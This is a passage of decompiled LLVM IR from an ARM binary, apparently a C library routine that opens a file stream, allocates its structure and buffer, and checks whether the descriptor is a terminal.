  store i32 %v0_16298, i32* %r0.global-to-local, align 4
  %v3_1629c = load i16, i16* @global_var_2222c.358, align 2
  %v4_1629c = sext i16 %v3_1629c to i32
  store i32 %v4_1629c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_162a4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162a4 = icmp eq i32 %v0_162a4, 0
  %v3_162a8 = add i32 %v4_1629c, %v0_16298
  %v4_162a8 = inttoptr i32 %v3_162a8 to i32*
  store i32 22, i32* %v4_162a8, align 4
  br i1 %v2_162a4, label %dec_label_pc_1666c, label %dec_label_pc_162b0

dec_label_pc_162b0:                               ; preds = %dec_label_pc_16388._crit_edge, %dec_label_pc_16294
  %v0_162b0 = load i32, i32* @r5, align 4
  %v1_162b0 = inttoptr i32 %v0_162b0 to i16*
  %v2_162b0 = load i16, i16* %v1_162b0, align 2
  %v3_162b0 = zext i16 %v2_162b0 to i32
  store i32 %v3_162b0, i32* %r3.global-to-local, align 4
  %v1_162b4 = and i32 %v3_162b0, 8192
  %v2_162b4 = icmp eq i32 %v1_162b4, 0
  br i1 %v2_162b4, label %dec_label_pc_1666c, label %dec_label_pc_162bc

dec_label_pc_162bc:                               ; preds = %dec_label_pc_162b0
  store i32 %v0_162b0, i32* @r0, align 4
  %v0_162c0 = call i32 @free()
  store i32 %v0_162c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1666c

dec_label_pc_162c8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_162cc

dec_label_pc_162cc:                               ; preds = %bb, %bb49, %dec_label_pc_162c8
  %v1_162e4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_162c8 ]
  %v1_162cc = add i32 %v0_16258, 1
  %v2_162cc = inttoptr i32 %v1_162cc to i8*
  %v3_162cc = load i8, i8* %v2_162cc, align 1
  %v2_162d0 = icmp ugt i8 %v3_162cc, 97
  store i1 %v2_162d0, i1* %cpsr_c.global-to-local, align 1
  %v7_162d0 = icmp eq i8 %v3_162cc, 98
  %v1_162cc.v0_16258 = select i1 %v7_162d0, i32 %v1_162cc, i32 %v0_16258
  store i32 %v1_162cc.v0_16258, i32* %r3.global-to-local, align 4
  %v1_162dc = add i32 %v1_162cc.v0_16258, 1
  %v2_162dc = inttoptr i32 %v1_162dc to i8*
  %v3_162dc = load i8, i8* %v2_162dc, align 1
  %v4_162dc = zext i8 %v3_162dc to i32
  store i32 %v4_162dc, i32* @r3, align 4
  %v2_162e0 = icmp ugt i8 %v3_162dc, 42
  store i1 %v2_162e0, i1* %cpsr_c.global-to-local, align 1
  %v7_162e0 = icmp eq i8 %v3_162dc, 43
  br i1 %v7_162e0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_162cc
  store i32 %v1_162e4, i32* @r3, align 4
  %v2_162e8 = add nuw nsw i32 %v1_162e4, 1
  store i32 %v2_162e8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_162cc, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162ec = icmp eq i32 %v0_16270, 0
  br i1 %v2_162ec, label %dec_label_pc_162f4, label %dec_label_pc_16330

dec_label_pc_162f4:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_162f8 = call i32 @malloc()
  store i32 %v0_162f8, i32* %r0.global-to-local, align 4
  store i32 %v0_162f8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_162fc = icmp eq i32 %v0_162f8, 0
  br i1 %v3_162fc, label %dec_label_pc_16670, label %dec_label_pc_16304

dec_label_pc_16304:                               ; preds = %dec_label_pc_162f4
  %v0_16308 = load i32, i32* @r8, align 4
  %v2_16308 = add i32 %v0_16308, -33136
  store i32 %v2_16308, i32* %r3.global-to-local, align 4
  %v1_1630c = inttoptr i32 %v2_16308 to i32*
  %v2_1630c = load i32, i32* %v1_1630c, align 4
  store i32 %v2_1630c, i32* %r0.global-to-local, align 4
  %v3_1630c = add i32 %v0_16308, -33132
  %v4_1630c = inttoptr i32 %v3_1630c to i32*
  %v5_1630c = load i32, i32* %v4_1630c, align 4
  store i32 %v5_1630c, i32* @r1, align 4
  %v6_1630c = add i32 %v0_16308, -33128
  %v7_1630c = inttoptr i32 %v6_1630c to i32*
  %v8_1630c = load i32, i32* %v7_1630c, align 4
  store i32 %v8_1630c, i32* %r2.global-to-local, align 4
  %v2_16318 = add i32 %v0_162f8, 8
  %v3_16318 = inttoptr i32 %v2_16318 to i32*
  store i32 0, i32* %v3_16318, align 4
  %v2_16320 = load i32, i32* @r5, align 4
  %v3_16320 = inttoptr i32 %v2_16320 to i16*
  store i16 8192, i16* %v3_16320, align 2
  %v2_16324 = load i32, i32* %r0.global-to-local, align 4
  %v0_16328 = load i32, i32* @r5, align 4
  %v1_16328 = add i32 %v0_16328, 56
  store i32 %v1_16328, i32* @r3, align 4
  %v1_1632c = inttoptr i32 %v1_16328 to i32*
  store i32 %v2_16324, i32* %v1_1632c, align 4
  %v3_1632c = add i32 %v0_16328, 60
  %v4_1632c = inttoptr i32 %v3_1632c to i32*
  %v5_1632c = load i32, i32* @r1, align 4
  store i32 %v5_1632c, i32* %v4_1632c, align 4
  %v6_1632c = add i32 %v0_16328, 64
  %v7_1632c = inttoptr i32 %v6_1632c to i32*
  %v8_1632c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1632c, i32* %v7_1632c, align 4
  %v0_16330.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16330

dec_label_pc_16330:                               ; preds = %.thread3, %dec_label_pc_16304
  %v0_16388 = phi i32 [ %v0_16274, %.thread3 ], [ %v0_16330.pre, %dec_label_pc_16304 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16330 = icmp slt i32 %v0_16388, 0
  br i1 %v1_16330, label %dec_label_pc_16388, label %dec_label_pc_16338

dec_label_pc_16338:                               ; preds = %dec_label_pc_16330
  %v0_1633c = load i32, i32* @r4, align 4
  %v2_1633c = and i32 %v0_1633c, 131075
  %v1_16340 = add nuw nsw i32 %v2_1633c, 1
  store i32 %v1_16340, i32* %r2.global-to-local, align 4
  %v0_16344 = load i32, i32* @r7, align 4
  %v1_16344 = add i32 %v0_16344, 1
  %v2_16348 = and i32 %v1_16344, %v1_16340
  store i32 %v2_16348, i32* %r3.global-to-local, align 4
  %v3_1634c = icmp uge i32 %v2_16348, %v1_16340
  store i1 %v3_1634c, i1* %cpsr_c.global-to-local, align 1
  %v9_1634c = icmp eq i32 %v2_16348, %v1_16340
  %v1_16350 = load i32, i32* @r5, align 4
  %v2_16350 = add i32 %v1_16350, 4
  %v3_16350 = inttoptr i32 %v2_16350 to i32*
  store i32 %v0_16388, i32* %v3_16350, align 4
  br i1 %v9_1634c, label %dec_label_pc_16358, label %dec_label_pc_16294

dec_label_pc_16358:                               ; preds = %dec_label_pc_16338
  %v0_16358 = load i32, i32* @r4, align 4
  %v1_16358 = load i32, i32* @r7, align 4
  %v2_16358 = sub i32 -1, %v1_16358
  %v3_16358 = and i32 %v0_16358, %v2_16358
  store i32 %v3_16358, i32* @r3, align 4
  %v1_1635c = and i32 %v3_16358, 1024
  %v2_1635c = icmp eq i32 %v1_1635c, 0
  br i1 %v2_1635c, label %dec_label_pc_1637c, label %dec_label_pc_16364

dec_label_pc_16364:                               ; preds = %dec_label_pc_16358
  %v0_16364 = load i32, i32* @r6, align 4
  store i32 %v0_16364, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_16370 = call i32 @__libc_fcntl(i32 %v0_16364, i32 4)
  store i32 %v2_16370, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16374 = icmp eq i32 %v2_16370, 0
  br i1 %v2_16374, label %dec_label_pc_16364.dec_label_pc_1637c_crit_edge, label %dec_label_pc_16294

dec_label_pc_16364.dec_label_pc_1637c_crit_edge:  ; preds = %dec_label_pc_16364
  %v0_1637c.pre = load i32, i32* @r7, align 4
  %v0_16380.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1637c

dec_label_pc_1637c:                               ; preds = %dec_label_pc_16364.dec_label_pc_1637c_crit_edge, %dec_label_pc_16358
  %v0_16380 = phi i32 [ %v0_16380.pre, %dec_label_pc_16364.dec_label_pc_1637c_crit_edge ], [ %v0_16358, %dec_label_pc_16358 ]
  %v0_1637c = phi i32 [ %v0_1637c.pre, %dec_label_pc_16364.dec_label_pc_1637c_crit_edge ], [ %v1_16358, %dec_label_pc_16358 ]
  %v1_1637c = and i32 %v0_1637c, 131072
  store i32 %v1_1637c, i32* %r3.global-to-local, align 4
  %v2_16380 = or i32 %v1_1637c, %v0_16380
  store i32 %v2_16380, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163ac

dec_label_pc_16388:                               ; preds = %dec_label_pc_16330
  %v2_16388 = icmp eq i32 %v0_16388, -1
  store i1 %v2_16388, i1* %cpsr_c.global-to-local, align 1
  %v7_16388 = icmp eq i32 %v0_16388, -1
  %v0_16394.pre = load i32, i32* @r4, align 4
  br i1 %v7_16388, label %dec_label_pc_16388._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_16388
  %v2_1638c = or i32 %v0_16394.pre, 131072
  store i32 %v2_1638c, i32* @r4, align 4
  br label %dec_label_pc_16388._crit_edge

dec_label_pc_16388._crit_edge:                    ; preds = %dec_label_pc_16388, %bb53
  %v0_16394 = phi i32 [ %v2_1638c, %bb53 ], [ %v0_16394.pre, %dec_label_pc_16388 ]
  %v0_16390 = load i32, i32* @r7, align 4
  store i32 %v0_16390, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1639c = call i32 @__libc_open(i32 %v0_16390, i32 %v0_16394)
  store i32 %v2_1639c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_163a0 = icmp slt i32 %v2_1639c, 0
  %v1_163a4 = load i32, i32* @r5, align 4
  %v2_163a4 = add i32 %v1_163a4, 4
  %v3_163a4 = inttoptr i32 %v2_163a4 to i32*
  store i32 %v2_1639c, i32* %v3_163a4, align 4
  br i1 %v1_163a0, label %dec_label_pc_162b0, label %.dec_label_pc_163ac_crit_edge

.dec_label_pc_163ac_crit_edge:                    ; preds = %dec_label_pc_16388._crit_edge
  %v0_163b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_163ac

dec_label_pc_163ac:                               ; preds = %.dec_label_pc_163ac_crit_edge, %dec_label_pc_1637c
  %v0_163c8 = phi i32 [ %v0_163b0.pre, %.dec_label_pc_163ac_crit_edge ], [ %v2_16380, %dec_label_pc_1637c ]
  %v0_163ac = load i32, i32* @r5, align 4
  %v1_163ac = inttoptr i32 %v0_163ac to i16*
  %v2_163ac = load i16, i16* %v1_163ac, align 2
  %v3_163ac = zext i16 %v2_163ac to i32
  %v1_163b0 = urem i32 %v0_163c8, 4
  %v1_163b4 = and i32 %v0_163c8, 1024
  %v1_163b8 = and i32 %v3_163ac, 8192
  %v1_163bc = add nuw nsw i32 %v1_163b0, 1
  %v2_163c0 = or i32 %v1_163b8, %v1_163b4
  store i32 %v2_163c0, i32* %r3.global-to-local, align 4
  %v1_163c4 = xor i32 %v1_163bc, 3
  %v1_163c8 = and i32 %v0_163c8, 131072
  store i32 %v1_163c8, i32* %r2.global-to-local, align 4
  %v2_163c8 = icmp eq i32 %v1_163c8, 0
  %v1_163cc = add i32 %v0_163ac, 4
  %v2_163cc = inttoptr i32 %v1_163cc to i32*
  %v3_163cc = load i32, i32* %v2_163cc, align 4
  store i32 %v3_163cc, i32* @r4, align 4
  br i1 %v2_163c8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_163ac
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_163ac, %bb54
  %v0_163d8 = phi i32 [ 0, %dec_label_pc_163ac ], [ 32768, %bb54 ]
  %v4_163d4 = mul nuw nsw i32 %v1_163c4, 16
  %v5_163d4 = or i32 %v2_163c0, %v4_163d4
  store i32 %v5_163d4, i32* %r3.global-to-local, align 4
  %v2_163d8 = or i32 %v0_163d8, %v5_163d4
  store i32 %v2_163d8, i32* %r2.global-to-local, align 4
  %v2_163dc = icmp ugt i32 %v3_163cc, 2147483646
  store i1 %v2_163dc, i1* %cpsr_c.global-to-local, align 1
  %v8_163dc = icmp eq i32 %v3_163cc, 2147483647
  %v1_163e0 = trunc i32 %v2_163d8 to i16
  store i16 %v1_163e0, i16* %v1_163ac, align 2
  br i1 %v8_163dc, label %dec_label_pc_16420, label %dec_label_pc_163e8

dec_label_pc_163e8:                               ; preds = %bb55
  store i32 48692, i32* %r3.global-to-local, align 4
  %v0_163ec = call i32 @__aeabi_read_tp()
  %v3_163f0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_163f0 = sext i16 %v3_163f0 to i32
  store i32 %v4_163f0, i32* @r3, align 4
  store i32 %v0_163ec, i32* @r6, align 4
  %v0_163f8 = load i32, i32* @r4, align 4
  store i32 %v0_163f8, i32* @r0, align 4
  %v2_163fc = add i32 %v4_163f0, %v0_163ec
  %v3_163fc = inttoptr i32 %v2_163fc to i32*
  %v4_163fc = load i32, i32* %v3_163fc, align 4
  store i32 %v4_163fc, i32* @r4, align 4
  %v1_16400 = call i32 @isatty(i32 %v0_163f8)
  store i32 %v1_16400, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16404 = icmp eq i32 %v1_16400, 0
  br i1 %v2_16404, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_163e8
  %v1_16408 = load i32, i32* @r5, align 4
  %v2_16408 = inttoptr i32 %v1_16408 to i16*
  %v3_16408 = load i16, i16* %v2_16408, align 2
  %v4_16408 = zext i16 %v3_16408 to i32
  %v2_1640c = or i32 %v4_16408, 256
  store i32 %v2_1640c, i32* %r3.global-to-local, align 4
  %v2_16410 = trunc i32 %v2_1640c to i16
  store i16 %v2_16410, i16* %v2_16408, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_163e8, %bb56
  %v3_16418 = load i16, i16* @global_var_2222c.358, align 2
  %v4_16418 = sext i16 %v3_16418 to i32
  store i32 %v4_16418, i32* %r3.global-to-local, align 4
  %v0_1641c = load i32, i32* @r4, align 4
  %v1_1641c = load i32, i32* @r6, align 4
  %v3_1641c = add i32 %v1_1641c, %v4_16418
  %v4_1641c = inttoptr i32 %v3_1641c to i32*
  store i32 %v0_1641c, i32* %v4_1641c, align 4
  br label %dec_label_pc_16420

dec_label_pc_16420:                               ; preds = %bb55, %.thread5
  %v0_16420 = load i32, i32* @r5, align 4
  %v1_16420 = add i32 %v0_16420, 8
  %v2_16420 = inttoptr i32 %v1_16420 to i32*
  %v3_16420 = load i32, i32* %v2_16420, align 4
  store i32 %v3_16420, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16424 = icmp eq i32 %v3_16420, 0
  br i1 %v2_16424, label %dec_label_pc_1642c, label %bb57

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16420
  store i32 4096, i32* @r0, align 4
  %v0_16430 = call i32 @malloc()
  store i32 %v0_16430, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16434 = icmp eq i32 %v0_16430, 0
  %v1_16444.pre = load i32, i32* @r5, align 4
  br i1 %v2_16434, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1642c
  %v2_16438 = inttoptr i32 %v1_16444.pre to i16*
  %v3_16438 = load i16, i16* %v2_16438, align 2
  %v4_16438 = zext i16 %v3_16438 to i32
  %v2_1643c = add i32 %v0_16430, 4096
  store i32 %v2_1643c, i32* %r2.global-to-local, align 4
  %v2_16440 = or i32 %v4_16438, 16384
  store i32 %v2_16440, i32* %r3.global-to-local, align 4
  %v2_16444 = add i32 %v1_16444.pre, 8
  %v3_16444 = inttoptr i32 %v2_16444 to i32*
  store i32 %v0_16430, i32* %v3_16444, align 4
  %v1_16448 = load i32, i32* %r2.global-to-local, align 4
  %v2_16448 = load i32, i32* @r5, align 4
  %v3_16448 = add i32 %v2_16448, 12
  %v4_16448 = inttoptr i32 %v3_16448 to i32*
  store i32 %v1_16448, i32* %v4_16448, align 4
  %v1_1644c = load i32, i32* %r3.global-to-local, align 4
  %v2_1644c = trunc i32 %v1_1644c to i16
  %v3_1644c = load i32, i32* @r5, align 4
  %v4_1644c = inttoptr i32 %v3_1644c to i16*
  store i16 %v2_1644c, i16* %v4_1644c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1642c
  %v2_1644437 = add i32 %v1_16444.pre, 8
  %v3_1644438 = inttoptr i32 %v2_1644437 to i32*
  store i32 0, i32* %v3_1644438, align 4
  %v2_16450 = load i32, i32* @r5, align 4
  %v3_16450 = add i32 %v2_16450, 12
  %v4_16450 = inttoptr i32 %v3_16450 to i32*
  store i32 0, i32* %v4_16450, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_16420, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1645c = load i32, i32* @r8, align 4
  %v2_1645c = add i32 %v0_1645c, 92
  %v3_1645c = inttoptr i32 %v2_1645c to i32*
  %v4_1645c = load i32, i32* %v3_1645c, align 4
  store i32 %v4_1645c, i32* %r3.global-to-local, align 4
  %v2_16460 = load i32, i32* @r5, align 4
  %v3_16460 = add i32 %v2_16460, 2
  %v4_16460 = inttoptr i32 %v3_16460 to i8*
  store i8 0, i8* %v4_16460, align 1
  %v0_16464 = load i32, i32* @r5, align 4
  %v1_16464 = inttoptr i32 %v0_16464 to i16*
  %v2_16464 = load i16, i16* %v1_16464, align 2
  %v3_16464 = zext i16 %v2_16464 to i32
  store i32 %v3_16464, i32* %r2.global-to-local, align 4
  %v0_16468 = load i32, i32* %r3.global-to-local, align 4
  %v1_16468 = inttoptr i32 %v0_16468 to i32*
  %v2_16468 = load i32, i32* %v1_16468, align 4
  store i32 %v2_16468, i32* @r1, align 4
  %v1_1646c = add i32 %v0_16464, 8
  %v2_1646c = inttoptr i32 %v1_1646c to i32*
  %v3_1646c = load i32, i32* %v2_1646c, align 4
  store i32 %v3_1646c, i32* %r3.global-to-local, align 4
  %v1_16470 = and i32 %v3_16464, 8192
  %v2_16470 = icmp eq i32 %v1_16470, 0
  %v2_16474 = add i32 %v0_16464, 20
  %v3_16474 = inttoptr i32 %v2_16474 to i32*
  store i32 %v3_1646c, i32* %v3_16474, align 4
  %v0_16478 = load i32, i32* @r1, align 4
  %v1_16478 = load i32, i32* @r5, align 4
  %v2_16478 = add i32 %v1_16478, 52
  %v3_16478 = inttoptr i32 %v2_16478 to i32*
  store i32 %v0_16478, i32* %v3_16478, align 4
  %v0_1647c = load i32, i32* %r3.global-to-local, align 4
  %v1_1647c = load i32, i32* @r5, align 4
  %v2_1647c = add i32 %v1_1647c, 24
  %v3_1647c = inttoptr i32 %v2_1647c to i32*
  store i32 %v0_1647c, i32* %v3_1647c, align 4
  %v0_16480 = load i32, i32* %r3.global-to-local, align 4
  %v1_16480 = load i32, i32* @r5, align 4
  %v2_16480 = add i32 %v1_16480, 28
  %v3_16480 = inttoptr i32 %v2_16480 to i32*
  store i32 %v0_16480, i32* %v3_16480, align 4
  %v0_16484 = load i32, i32* %r3.global-to-local, align 4
  %v1_16484 = load i32, i32* @r5, align 4
  %v2_16484 = add i32 %v1_16484, 16
  %v3_16484 = inttoptr i32 %v2_16484 to i32*
  store i32 %v0_16484, i32* %v3_16484, align 4
  %v0_16488 = load i32, i32* %r4.global-to-local, align 4
  %v1_16488 = load i32, i32* @r5, align 4
  %v2_16488 = add i32 %v1_16488, 44
  %v3_16488 = inttoptr i32 %v2_16488 to i32*
  store i32 %v0_16488, i32* %v3_16488, align 4
  br i1 %v2_16470, label %dec_label_pc_16670, label %dec_label_pc_16490

dec_label_pc_16490:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16494 = load i32, i32* @r8, align 4
  %v2_16494 = add i32 %v0_16494, 160
  %v3_16494 = inttoptr i32 %v2_16494 to i32*
  %v4_16494 = load i32, i32* %v3_16494, align 4
  store i32 %v4_16494, i32* %r7.global-to-local, align 4
  %v0_16498 = call i32 @__aeabi_read_tp()
  store i32 %v0_16498, i32* %r0.global-to-local, align 4
  %v1_1649c = add i32 %v4_16494, 8
  %v2_1649c = inttoptr i32 %v1_1649c to i32*
  %v3_1649c = load i32, i32* %v2_1649c, align 4
  store i32 %v3_1649c, i32* %r3.global-to-local, align 4
  %v1_164a0 = add i32 %v0_16498, -1168
  store i32 %v1_164a0, i32* %r6.global-to-local, align 4
  %v3_164a4 = icmp uge i32 %v3_1649c, %v1_164a0
  store i1 %v3_164a4, i1* %cpsr_c.global-to-local, align 1
  %v9_164a4 = icmp eq i32 %v3_1649c, %v1_164a0
  br i1 %v9_164a4, label %dec_label_pc_164e8, label %dec_label_pc_164ac

dec_label_pc_164ac:                               ; preds = %dec_label_pc_16490
  store i32 %v4_16494, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164b4

dec_label_pc_164b4:                               ; preds = %dec_label_pc_164c0.dec_label_pc_164b4_crit_edge, %dec_label_pc_164ac
  %v0_164b4 = phi i32 [ %v0_164b4.pre, %dec_label_pc_164c0.dec_label_pc_164b4_crit_edge ], [ %v4_16494, %dec_label_pc_164ac ]
  %v1_164b4 = inttoptr i32 %v0_164b4 to i32*
  %v2_164b4 = load i32, i32* %v1_164b4, align 4
  store i32 %v2_164b4, i32* %r3.global-to-local, align 4
  %v1_164b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_164b8 = icmp uge i32 %v2_164b4, %v1_164b8
  store i1 %v3_164b8, i1* %cpsr_c.global-to-local, align 1
  %v9_164b8 = icmp eq i32 %v2_164b4, %v1_164b8
  br i1 %v9_164b8, label %dec_label_pc_164c0, label %dec_label_pc_164d8

dec_label_pc_164c0:                               ; preds = %dec_label_pc_164b4
  store i32 %v2_164b4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_164d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_164d0, label %dec_label_pc_164d4, label %dec_label_pc_164c0.dec_label_pc_164b4_crit_edge

dec_label_pc_164c0.dec_label_pc_164b4_crit_edge:  ; preds = %dec_label_pc_164c0
  %v0_164b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164b4

dec_label_pc_164d4:                               ; preds = %dec_label_pc_164c0
  %v0_164d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_164d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_164d8

dec_label_pc_164d8:                               ; preds = %dec_label_pc_164b4, %dec_label_pc_164d4
  %v0_164d8 = phi i32 [ %v0_164d4, %dec_label_pc_164d4 ], [ %v2_164b4, %dec_label_pc_164b4 ]
  %v1_164d8 = phi i32 [ %v0_164d4, %dec_label_pc_164d4 ], [ %v1_164b8, %dec_label_pc_164b4 ]
  %v3_164d8 = icmp uge i32 %v0_164d8, %v1_164d8
  store i1 %v3_164d8, i1* %cpsr_c.global-to-local, align 1
  %v9_164d8 = icmp eq i32 %v0_164d8, %v1_164d8
  br i1 %v9_164d8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_164d8
  %v1_164dc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_164dc, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_164d8, %bb58
  %v1_164e0 = xor i1 %v9_164d8, true
  call void @__pseudo_cond_branch(i1 %v1_164e0, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_164e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_164e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_164e4 = add i32 %v1_164e4, 8
  %v3_164e4 = inttoptr i32 %v2_164e4 to i32*
  store i32 %v0_164e4, i32* %v3_164e4, align 4
  %v1_16504.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_16490, %bb59
  %v1_16504 = phi i32 [ %v3_1649c, %dec_label_pc_16490 ], [ %v1_16504.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_164ec = load i32, i32* @r8, align 4
  %v2_164ec = add i32 %v0_164ec, 160
  %v3_164ec = inttoptr i32 %v2_164ec to i32*
  %v4_164ec = load i32, i32* %v3_164ec, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_164f4 = add i32 %v0_164ec, 152
  %v3_164f4 = inttoptr i32 %v2_164f4 to i32*
  %v4_164f4 = load i32, i32* %v3_164f4, align 4
  store i32 %v4_164f4, i32* %r7.global-to-local, align 4
  %v1_164f8 = add i32 %v4_164ec, 4
  %v2_164f8 = inttoptr i32 %v1_164f8 to i32*
  %v3_164f8 = load i32, i32* %v2_164f8, align 4
  store i32 %v3_164f8, i32* %r3.global-to-local, align 4
  %v1_164fc = add i32 %v4_164f4, 8
  %v2_164fc = inttoptr i32 %v1_164fc to i32*
  %v3_164fc = load i32, i32* %v2_164fc, align 4
  store i32 %v3_164fc, i32* %r2.global-to-local, align 4
  %v1_16500 = add i32 %v3_164f8, 1
  store i32 %v1_16500, i32* %r3.global-to-local, align 4
  %v3_16504 = icmp uge i32 %v3_164fc, %v1_16504
  store i1 %v3_16504, i1* %cpsr_c.global-to-local, align 1
  %v9_16504 = icmp eq i32 %v3_164fc, %v1_16504
  store i32 %v1_16500, i32* %v2_164f8, align 4
  br i1 %v9_16504, label %dec_label_pc_16550, label %dec_label_pc_16510

dec_label_pc_16510:                               ; preds = %dec_label_pc_164e8
  %v0_16514 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16514, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1651c95 = inttoptr i32 %v0_16514 to i32*
  %v2_1651c96 = load i32, i32* %v1_1651c95, align 4
  store i32 %v2_1651c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1652098 = icmp eq i32 %v2_1651c96, 0
  br i1 %v9_1652098, label %dec_label_pc_16528, label %dec_label_pc_16540

dec_label_pc_16528:                               ; preds = %dec_label_pc_16510, %dec_label_pc_16528.dec_label_pc_1651c_crit_edge
  %v0_1652899 = phi i32 [ %v1_16520.pre, %dec_label_pc_16528.dec_label_pc_1651c_crit_edge ], [ 0, %dec_label_pc_16510 ]
  store i32 %v0_1652899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16538 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16538, label %dec_label_pc_1653c, label %dec_label_pc_16528.dec_label_pc_1651c_crit_edge

dec_label_pc_16528.dec_label_pc_1651c_crit_edge:  ; preds = %dec_label_pc_16528
  %v0_1651c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16520.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1651c = inttoptr i32 %v0_1651c.pre to i32*
  %v2_1651c = load i32, i32* %v1_1651c, align 4
  store i32 %v2_1651c, i32* %r3.global-to-local, align 4
  %v3_16520 = icmp uge i32 %v2_1651c, %v1_16520.pre
  store i1 %v3_16520, i1* %cpsr_c.global-to-local, align 1
  %v9_16520 = icmp eq i32 %v2_1651c, %v1_16520.pre
  br i1 %v9_16520, label %dec_label_pc_16528, label %dec_label_pc_16540

dec_label_pc_1653c:                               ; preds = %dec_label_pc_16528
  %v0_1653c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1653c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16540

dec_label_pc_16540:                               ; preds = %dec_label_pc_16510, %dec_label_pc_16528.dec_label_pc_1651c_crit_edge, %dec_label_pc_1653c
  %v0_16540 = phi i32 [ %v0_1653c, %dec_label_pc_1653c ], [ %v2_1651c96, %dec_label_pc_16510 ], [ %v2_1651c, %dec_label_pc_16528.dec_label_pc_1651c_crit_edge ]
  %v1_16540 = phi i32 [ %v0_1653c, %dec_label_pc_1653c ], [ 0, %dec_label_pc_16510 ], [ %v1_16520.pre, %dec_label_pc_16528.dec_label_pc_1651c_crit_edge ]
  %v3_16540 = icmp uge i32 %v0_16540, %v1_16540
  store i1 %v3_16540, i1* %cpsr_c.global-to-local, align 1
  %v9_16540 = icmp eq i32 %v0_16540, %v1_16540
  br i1 %v9_16540, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_16540
  %v1_16544 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16544, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_16540, %bb60
  %v1_16548 = xor i1 %v9_16540, true
  call void @__pseudo_cond_branch(i1 %v1_16548, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_1654c = load i32, i32* %r6.global-to-local, align 4
  %v1_1654c = load i32, i32* %r7.global-to-local, align 4
  %v2_1654c = add i32 %v1_1654c, 8
  %v3_1654c = inttoptr i32 %v2_1654c to i32*
  store i32 %v0_1654c, i32* %v3_1654c, align 4
  br label %dec_label_pc_16550

dec_label_pc_16550:                               ; preds = %dec_label_pc_164e8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16554 = load i32, i32* @r8, align 4
